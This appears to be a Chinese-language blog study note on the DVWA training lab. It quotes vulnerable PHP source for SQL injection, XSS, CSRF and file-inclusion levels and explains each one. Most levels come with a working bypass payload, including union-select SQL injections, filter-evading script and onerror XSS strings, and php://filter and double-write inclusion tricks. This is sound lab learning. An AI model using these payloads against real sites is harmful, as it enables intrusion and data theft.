<p>is_numeric() 函数用于检测变量是否为数字或数字字符串。</p>
<p>涉及函数：</p>
<p>[stripslashes][<a href="https://www.w3school.com.cn/php/func_string_stripslashes.asp]">https://www.w3school.com.cn/php/func_string_stripslashes.asp]</a></p>
<p>[explode][<a href="https://www.w3school.com.cn/php/func_string_explode.asp]">https://www.w3school.com.cn/php/func_string_explode.asp]</a></p>
<p>[is_numeric()][<a href="https://www.runoob.com/php/php-is_numeric-function.html]">https://www.runoob.com/php/php-is_numeric-function.html]</a></p>
<p>payload：这个我不会，哈哈。</p>
<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><h2 id="0x01-1"><a href="#0x01-1" class="headerlink" title="0x01"></a>0x01</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_REQUEST[ &#x27;Submit&#x27; ] ) ) &#123;</span><br><span class="line">	// Get input</span><br><span class="line">	$id = $_REQUEST[ &#x27;id&#x27; ];</span><br><span class="line"></span><br><span class="line">	// Check database</span><br><span class="line">	$query  = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;$id&#x27;;&quot;;</span><br><span class="line">	$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; );</span><br><span class="line"></span><br><span class="line">	// Get results</span><br><span class="line">	while( $row = mysqli_fetch_assoc( $result ) ) &#123;</span><br><span class="line">		// Get values</span><br><span class="line">		$first = $row[&quot;first_name&quot;];</span><br><span class="line">		$last  = $row[&quot;last_name&quot;];</span><br><span class="line"></span><br><span class="line">		// Feedback for end user</span><br><span class="line">		$html .= &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p> <code>$_REQUEST</code> 包含了 <code>$_GET</code>，<code>$_POST</code> 和 <code>$_COOKIE</code> 的数组，可以被远程用户篡改</p>
<p>is_object()** 函数用于检测变量是否是一个对象。PHP 版本要求: PHP 4, PHP 5, PHP 7</p>
<p>mysqli_error() 函数返回最近调用函数的最后一个错误描述</p>
<p>mysqli_fetch_assoc() 函数从结果集中取得一行作为关联数组,区分大小写</p>
<p>$_GLOBALS[“__mysqli_ston”]是规定使用的MySQL连接</p>
<p>从下图可以看出，它是完全没做防护就直接执行的</p>
<p><img src="/.io//Users\whites\AppData\Roaming\Typora\typora-user-images\image-20200404063154458.png" alt="image-20200404063154458"></p>
<p>所以就直接构造payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2&#x27; -- </span><br></pre></td></tr></table></figure>



<h2 id="0x02-1"><a href="#0x02-1" class="headerlink" title="0x02"></a>0x02</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_POST[ &#x27;Submit&#x27; ] ) ) &#123;</span><br><span class="line">	// Get input</span><br><span class="line">	$id = $_POST[ &#x27;id&#x27; ];</span><br><span class="line"></span><br><span class="line">	$id = mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $id);</span><br><span class="line"></span><br><span class="line">	$query  = &quot;SELECT first_name, last_name FROM users WHERE user_id = $id;&quot;;</span><br><span class="line">	$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query) or die( &#x27;&lt;pre&gt;&#x27; . mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) . &#x27;&lt;/pre&gt;&#x27; );</span><br><span class="line"></span><br><span class="line">	// Get results</span><br><span class="line">	while( $row = mysqli_fetch_assoc( $result ) ) &#123;</span><br><span class="line">		// Display values</span><br><span class="line">		$first = $row[&quot;first_name&quot;];</span><br><span class="line">		$last  = $row[&quot;last_name&quot;];</span><br><span class="line"></span><br><span class="line">		// Feedback for end user</span><br><span class="line">		$html .= &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// This is used later on in the index.php page</span><br><span class="line">// Setting it here so we can close the database connection in here like in the rest of the source scripts</span><br><span class="line">$query  = &quot;SELECT COUNT(*) FROM users;&quot;;</span><br><span class="line">$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; );</span><br><span class="line">$number_of_rows = mysqli_fetch_row( $result )[0];</span><br><span class="line"></span><br><span class="line">mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>mysqli_real_escape_string() 函数转义在 SQL 语句中使用的字符串中的特殊字符</p>
<p>这串代码，其实就只是做了这一个防护，也就是转义特殊字符</p>
<p>转义的字符串有：NUL（ASCII 0）、\n、\r、\、’、” 和 Control-Z</p>
<p>但是，这里它本来就是数字型注入，所以我们不需要 <code>&#39;</code> 闭合字符串，那<code>mysql_real_escape_string()</code> 的过滤就没什么用了</p>
<p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 or 1=1 union select database(),2</span><br></pre></td></tr></table></figure>



<h2 id="0x03-1"><a href="#0x03-1" class="headerlink" title="0x03"></a>0x03</h2><p>high.php</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_SESSION [ &#x27;id&#x27; ] ) ) &#123;</span><br><span class="line">	// Get input</span><br><span class="line">	$id = $_SESSION[ &#x27;id&#x27; ];</span><br><span class="line"></span><br><span class="line">	// Check database</span><br><span class="line">	$query  = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;$id&#x27; LIMIT 1;&quot;;</span><br><span class="line">	$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#x27;&lt;pre&gt;Something went wrong.&lt;/pre&gt;&#x27; );</span><br><span class="line"></span><br><span class="line">	// Get results</span><br><span class="line">	while( $row = mysqli_fetch_assoc( $result ) ) &#123;</span><br><span class="line">		// Get values</span><br><span class="line">		$first = $row[&quot;first_name&quot;];</span><br><span class="line">		$last  = $row[&quot;last_name&quot;];</span><br><span class="line"></span><br><span class="line">		// Feedback for end user</span><br><span class="line">		$html .= &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);		</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>在sql语句中添加LIMIT1，以此限定每次输出的结果只有1个记录，不会输出所有记录</p>
<p>session-input.php</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?phpdefine( &#x27;DVWA_WEB_PAGE_TO_ROOT&#x27;, &#x27;../../&#x27; );require_once DVWA_WEB_PAGE_TO_ROOT . &#x27;dvwa/includes/dvwaPage.inc.php&#x27;;dvwaPageStartup( array( &#x27;authenticated&#x27;, &#x27;phpids&#x27; ) );$page = dvwaPageNewGrab();$page[ &#x27;title&#x27; ] = &#x27;SQL Injection Session Input&#x27; . $page[ &#x27;title_separator&#x27; ].$page[ &#x27;title&#x27; ];if( isset( $_POST[ &#x27;id&#x27; ] ) ) &#123;	$_SESSION[ &#x27;id&#x27; ] =  $_POST[ &#x27;id&#x27; ];	//$page[ &#x27;body&#x27; ] .= &quot;Session ID set!&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&quot;;	$page[ &#x27;body&#x27; ] .= &quot;Session ID: &#123;$_SESSION[ &#x27;id&#x27; ]&#125;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&quot;;	$page[ &#x27;body&#x27; ] .= &quot;&lt;script&gt;window.opener.location.reload(true);&lt;/script&gt;&quot;;&#125;$page[ &#x27;body&#x27; ] .= &quot;&lt;form action=\&quot;#\&quot; method=\&quot;POST\&quot;&gt;	&lt;input type=\&quot;text\&quot; size=\&quot;15\&quot; name=\&quot;id\&quot;&gt;	&lt;input type=\&quot;submit\&quot; name=\&quot;Submit\&quot; value=\&quot;Submit\&quot;&gt;&lt;/form&gt;&lt;hr /&gt;&lt;br /&gt;&lt;button onclick=\&quot;self.close();\&quot;&gt;Close&lt;/button&gt;&quot;;dvwaSourceHtmlEcho( $page );?&gt;</span><br></pre></td></tr></table></figure>

<p>因为high.php直接跳转到session-input.php函数中，所以直接看后者就ok,没有防护，那就和第一个一样了</p>
<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; union select 1,database() #</span><br></pre></td></tr></table></figure>



<h2 id="0x04-1"><a href="#0x04-1" class="headerlink" title="0x04"></a>0x04</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?phpif( isset( $_GET[ &#x27;Submit&#x27; ] ) ) &#123;	// Check Anti-CSRF token	checkToken( $_REQUEST[ &#x27;user_token&#x27; ], $_SESSION[ &#x27;session_token&#x27; ], &#x27;index.php&#x27; );	// Get input	$id = $_GET[ &#x27;id&#x27; ];	// Was a number entered?	if(is_numeric( $id )) &#123;		// Check the database		$data = $db-&gt;prepare( &#x27;SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;&#x27; );		$data-&gt;bindParam( &#x27;:id&#x27;, $id, PDO::PARAM_INT );		$data-&gt;execute();		$row = $data-&gt;fetch();		// Make sure only 1 result is returned		if( $data-&gt;rowCount() == 1 ) &#123;			// Get values			$first = $row[ &#x27;first_name&#x27; ];			$last  = $row[ &#x27;last_name&#x27; ];			// Feedback for end user			$html .= &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;;		&#125;	&#125;&#125;// Generate Anti-CSRF tokengenerateSessionToken();?&gt;</span><br></pre></td></tr></table></figure>



<h1 id="xss注入"><a href="#xss注入" class="headerlink" title="xss注入"></a>xss注入</h1><h2 id="0x01-2"><a href="#0x01-2" class="headerlink" title="0x01"></a>0x01</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php// Is there any input?if ( array_key_exists( &quot;default&quot;, $_GET ) &amp;&amp; !is_null ($_GET[ &#x27;default&#x27; ]) ) &#123;	$default = $_GET[&#x27;default&#x27;];		# Do not allow script tags	if (stripos ($default, &quot;&lt;script&quot;) !== false) &#123;		header (&quot;location: ?default=English&quot;);		exit;	&#125;&#125;?&gt;</span><br></pre></td></tr></table></figure>

<p>if括号内判断是否存在&lt;script字符串，如果不存在，就返回HTTP报头</p>
<p>涉及函数：</p>
<p>array_key_exists() 函数检查某个数组中是否存在指定的键名，如果键名存在则返回 true，如果键名不存在则返回 false</p>
<p>stripos() 函数查找字符串在另一字符串中第一次出现的位置（不区分大小写）</p>
<p>header() 函数向客户端发送原始的 HTTP 报头</p>
<p>pyload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;/option&gt;&lt;/select&gt;&lt;img src=1 onerror=alert(&quot;111&quot;)&gt;</span><br></pre></td></tr></table></figure>



<h2 id="0x02-2"><a href="#0x02-2" class="headerlink" title="0x02"></a>0x02</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php// Is there any input?if ( array_key_exists( &quot;default&quot;, $_GET ) &amp;&amp; !is_null ($_GET[ &#x27;default&#x27; ]) ) &#123;	# White list the allowable languages	switch ($_GET[&#x27;default&#x27;]) &#123;		case &quot;French&quot;:		case &quot;English&quot;:		case &quot;German&quot;:		case &quot;Spanish&quot;:			# ok			break;		default:			header (&quot;location: ?default=English&quot;);			exit;	&#125;&#125;?&gt;</span><br></pre></td></tr></table></figure>

<p>这里，由于switch的加入，于是变成必须是default变量中的值，也就是French，English，German，Spanish才行否则就进行跳转结束运行；</p>
<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">default=German&amp;x=&lt;script&gt;alert(/123/)&lt;/script&gt;default=German#&lt;script&gt;alert(/123/)&lt;/script&gt;</span><br></pre></td></tr></table></figure>



<h2 id="0x03-2"><a href="#0x03-2" class="headerlink" title="0x03"></a>0x03</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?phpheader (&quot;X-XSS-Protection: 0&quot;);// Is there any input?if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#x27;name&#x27; ] != NULL ) &#123;	// Feedback for end user	$html .= &#x27;&lt;pre&gt;Hello &#x27; . $_GET[ &#x27;name&#x27; ] . &#x27;&lt;/pre&gt;&#x27;;&#125;?&gt;</span><br></pre></td></tr></table></figure>

<p>这里的话，他其实没做任何防护，所以，要做的，其实就是闭合html中的标签而已</p>
<p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">123&quot;&gt;&lt;script&gt;alert(124)&lt;/script&gt;</span><br></pre></td></tr></table></figure>



<h2 id="0x04-2"><a href="#0x04-2" class="headerlink" title="0x04"></a>0x04</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?phpheader (&quot;X-XSS-Protection: 0&quot;);// Is there any input?if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#x27;name&#x27; ] != NULL ) &#123;	// Get input	$name = str_replace( &#x27;&lt;script&gt;&#x27;, &#x27;&#x27;, $_GET[ &#x27;name&#x27; ] );	// Feedback for end user	$html .= &quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;;&#125;?&gt;</span><br></pre></td></tr></table></figure>

<p>这里使用了<strong>str_replace</strong>函数，直接过滤**<script>**转换为空字符，可以试试叠加script</p>
<p>设计函数：</p>
<p>str_replace() 函数以其他字符替换字符串中的一些字符（区分大小写）</p>
<p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">12&quot;&gt;&lt;sc&lt;script&gt;ript&gt;alert(123)&lt;/script&gt;</span><br></pre></td></tr></table></figure>



<h2 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?phpheader (&quot;X-XSS-Protection: 0&quot;);// Is there any input?if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#x27;name&#x27; ] != NULL ) &#123;	// Get input	$name = preg_replace( &#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;, &#x27;&#x27;, $_GET[ &#x27;name&#x27; ] );	// Feedback for end user	$html .= &quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;;&#125;?&gt;</span><br></pre></td></tr></table></figure>

<p>使用正则过滤了script，大小写不区分</p>
<p>涉及函数：</p>
<p>preg_replace 函数执行一个正则表达式的搜索和替换</p>
<p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">123&quot;&gt;&lt;img src=1 onerror=alert(124)&gt;</span><br></pre></td></tr></table></figure>



<h2 id="0x06"><a href="#0x06" class="headerlink" title="0x06"></a>0x06</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php// Is there any input?if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#x27;name&#x27; ] != NULL ) &#123;	// Check Anti-CSRF token	checkToken( $_REQUEST[ &#x27;user_token&#x27; ], $_SESSION[ &#x27;session_token&#x27; ], &#x27;index.php&#x27; );	// Get input	$name = htmlspecialchars( $_GET[ &#x27;name&#x27; ] );	// Feedback for end user	$html .= &quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;;&#125;// Generate Anti-CSRF tokengenerateSessionToken();?&gt;</span><br></pre></td></tr></table></figure>

<p>htmlspecialchars() 函数把预定义的字符转换为 HTML 实体</p>
<h2 id="0x07"><a href="#0x07" class="headerlink" title="0x07"></a>0x07</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?phpif( isset( $_POST[ &#x27;btnSign&#x27; ] ) ) &#123;	// Get input	$message = trim( $_POST[ &#x27;mtxMessage&#x27; ] );	$name    = trim( $_POST[ &#x27;txtName&#x27; ] );	// Sanitize message input	$message = stripslashes( $message );	$message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));	// Sanitize name input	$name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));	// Update database	$query  = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;$message&#x27;, &#x27;$name&#x27; );&quot;;	$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; );	//mysql_close();&#125;?&gt;</span><br></pre></td></tr></table></figure>

<p>涉及函数：</p>
<p>trim() 函数移除字符串两侧的空白字符或其他预定义字符</p>
<p>stripslashes() 函数删除由 addslashes() 函数添加的反斜杠</p>
<p>is_object() 函数用于检测变量是否是一个对象</p>
<h2 id="0x08"><a href="#0x08" class="headerlink" title="0x08"></a>0x08</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?phpif( isset( $_POST[ &#x27;btnSign&#x27; ] ) ) &#123;	// Get input	$message = trim( $_POST[ &#x27;mtxMessage&#x27; ] );	$name    = trim( $_POST[ &#x27;txtName&#x27; ] );	// Sanitize message input	$message = strip_tags( addslashes( $message ) );	$message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));	$message = htmlspecialchars( $message );	// Sanitize name input	$name = str_replace( &#x27;&lt;script&gt;&#x27;, &#x27;&#x27;, $name );	$name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));	// Update database	$query  = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;$message&#x27;, &#x27;$name&#x27; );&quot;;	$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; );	//mysql_close();&#125;?&gt;</span><br></pre></td></tr></table></figure>

<p>涉及函数：</p>
<p>strip_tags() 函数剥去字符串中的 HTML、XML 以及 PHP 的标签</p>
<h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><h2 id="0x01-3"><a href="#0x01-3" class="headerlink" title="0x01"></a>0x01</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?phpif( isset( $_GET[ &#x27;Change&#x27; ] ) ) &#123;	// Checks to see where the request came from	if( stripos( $_SERVER[ &#x27;HTTP_REFERER&#x27; ] ,$_SERVER[ &#x27;SERVER_NAME&#x27; ]) !== false ) &#123;		// Get input		$pass_new  = $_GET[ &#x27;password_new&#x27; ];		$pass_conf = $_GET[ &#x27;password_conf&#x27; ];		// Do the passwords match?		if( $pass_new == $pass_conf ) &#123;			// They do!			$pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));			$pass_new = md5( $pass_new );			// Update the database			$insert = &quot;UPDATE `users` SET password = &#x27;$pass_new&#x27; WHERE user = &#x27;&quot; . dvwaCurrentUser() . &quot;&#x27;;&quot;;			$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; );			// Feedback for the user			$html .= &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;		&#125;		else &#123;			// Issue with passwords matching			$html .= &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;;		&#125;	&#125;	else &#123;		// Didn&#x27;t come from a trusted source		$html .= &quot;&lt;pre&gt;That request didn&#x27;t look correct.&lt;/pre&gt;&quot;;	&#125;	((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);&#125;?&gt;</span><br></pre></td></tr></table></figure>

<p>stripos函数会验证请求头，但它写的头验证是可以绕过的，那，就仿造一个呗。stripos()函数是多次匹配； 只要包含了目标主机地址就可以绕过stripos()函数写的验证语句</p>
<p>如果我们依旧按照建立一个伪造的攻击页面，stripos()头验证就会验证，然而页面并不是来自DVWA；于是深挖stripos()函数的漏洞，发现函数会多次匹配，于是思路就是建立一个假的文件名，通过一个伪造的文件名，绕过stripos()的验证</p>
<p>$_SERVER[ ‘HTTP_REFERER’ ] 查询当前页的前一页的地址信息<br> $_SERVER[ ‘SERVER_NAME’ ] 获取域名<br> stripos ()函数查找字符串在另一字符串中第一次出现的位置（不区分大小写）</p>
<h2 id="0x02-3"><a href="#0x02-3" class="headerlink" title="0x02"></a>0x02</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?phpif( isset( $_GET[ &#x27;Change&#x27; ] ) ) &#123;	// Check Anti-CSRF token	checkToken( $_REQUEST[ &#x27;user_token&#x27; ], $_SESSION[ &#x27;session_token&#x27; ], &#x27;index.php&#x27; );	// Get input	$pass_new  = $_GET[ &#x27;password_new&#x27; ];	$pass_conf = $_GET[ &#x27;password_conf&#x27; ];	// Do the passwords match?	if( $pass_new == $pass_conf ) &#123;		// They do!		$pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));		$pass_new = md5( $pass_new );		// Update the database		$insert = &quot;UPDATE `users` SET password = &#x27;$pass_new&#x27; WHERE user = &#x27;&quot; . dvwaCurrentUser() . &quot;&#x27;;&quot;;		$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; );		// Feedback for the user		$html .= &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;	&#125;	else &#123;		// Issue with passwords matching		$html .= &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;;	&#125;	((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);&#125;// Generate Anti-CSRF tokengenerateSessionToken();?&gt;</span><br></pre></td></tr></table></figure>

<p>未完。。。。。</p>
<h1 id="文件包含、上传，目录穿越"><a href="#文件包含、上传，目录穿越" class="headerlink" title="文件包含、上传，目录穿越"></a>文件包含、上传，目录穿越</h1><h2 id="0x00-1"><a href="#0x00-1" class="headerlink" title="0x00"></a>0x00</h2><p>require:找不到被包含的文件，报错，并且停止运行脚本。</p>
<p>include:找不到被包含的文件,只会报错，但会继续运行脚本。</p>
<p>require_once:与require类似,区别在于当重复调用同一文件时,程序只调用一次。</p>
<p>include_once:与include类似,区别在于当重复调用同一文件时,程序只调用一次。</p>
<h2 id="0x01-4"><a href="#0x01-4" class="headerlink" title="0x01"></a>0x01</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php// The page we wish to display$file = $_GET[ &#x27;page&#x27; ];// Input validation$file = str_replace( array( &quot;http://&quot;, &quot;https://&quot; ), &quot;&quot;, $file );$file = str_replace( array( &quot;../&quot;, &quot;..\&quot;&quot; ), &quot;&quot;, $file );?&gt;</span><br></pre></td></tr></table></figure>

<p>过滤了</p>
<p>http:// </p>
<p>https://</p>
<p>../</p>
<p>..\</p>
<p>通过双写来绕过，或者使用绝对路径来绕过，也可以试试编码绕过</p>
<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hthttp://tp://127.0.0.1/2.txt</span><br></pre></td></tr></table></figure>



<h2 id="0x02-4"><a href="#0x02-4" class="headerlink" title="0x02"></a>0x02</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php// The page we wish to display$file = $_GET[ &#x27;page&#x27; ];// Input validationif( !fnmatch( &quot;file*&quot;, $file ) &amp;&amp; $file != &quot;include.php&quot; ) &#123;	// This isn&#x27;t the page we want!	echo &quot;ERROR: File not found!&quot;;	exit;&#125;?&gt;</span><br></pre></td></tr></table></figure>

<p>fnmatch() 函数根据指定的模式来匹配文件名或字符串</p>
<p>想起没有phpstudy的时候，访问自己的本地文件，前面总会出现file:///</p>
<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file:///C:\phpStudy\PHPTutorial\WWW\2.txt利用php://来读取文件php://filter/read=convert.base64-encode/resource=C:\phpStudy\PHPTutorial\WWW\2.txt</span><br></pre></td></tr></table></figure>



<h2 id="0x03-3"><a href="#0x03-3" class="headerlink" title="0x03"></a>0x03</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php// The page we wish to display$file = $_GET[ &#x27;page&#x27; ];// Only allow include.php or file&#123;1..3&#125;.phpif( $file != &quot;include.php&quot; &amp;&amp; $file != &quot;file1.php&quot; &amp;&amp; $file != &quot;file2.php&quot; &amp;&amp; $file != &quot;file3.php&quot; ) &#123;   // This isn&#x27;t the page we want!   echo &quot;ERROR: File not found!&quot;;   exit;&#125;?&gt;</span><br></pre></td></tr></table></figure>

<p>才疏学浅，告辞</p>
